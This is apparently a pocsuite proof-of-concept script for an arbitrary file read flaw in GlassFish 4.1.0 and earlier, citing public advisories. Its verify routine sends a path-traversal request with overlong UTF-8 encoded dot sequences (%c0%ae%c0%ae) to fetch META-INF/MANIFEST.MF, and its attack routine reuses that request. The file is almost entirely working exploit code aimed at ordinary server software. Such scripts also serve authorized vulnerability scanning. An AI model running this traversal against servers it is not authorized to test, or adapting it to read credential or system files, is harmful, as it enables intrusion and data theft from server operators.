#!/usr/bin/env python
# coding: utf-8

import re

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '90437'
    version = '1'
    author = 'RickGray'
    vulDate = '2016-01-14'
    createDate = '2016-01-14'
    updateDate = '2016-01-14'
    references = [
        'https://www.sebug.net/vuldb/ssvid-90437',
        'http://www.oracle.com/us/products/middleware/cloud-app-foundation/glassfish-server/overview/index.html',
        'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904'
    ]
    name = 'GlassFish <= 4.1.0 任意文件读取漏洞 POC'
    appPowerLink = 'https://glassfish.java.net'
    appName = 'GlassFish'
    appVersion = '<= 4.1.0'
    vulType = 'Arbitrary File Read'
    desc = '''

    '''

    samples = []

    def _verify(self):
        v_url = '/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF'
        response = req.get(self.url + v_url)
    
        return self.parse_verify(response)

    def _attack(self):
        return self._verify()

    def parse_verify(self, response):
        output = Output(self)
        result = {}
        
        if re.search(r'Manifest-Version|Mainfest.*Versioin', response.content):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = response.url
            output.success(result)
        else:
            output.fail('Failed to read file or not be vulnerable')

        return output


register(TestPOC)
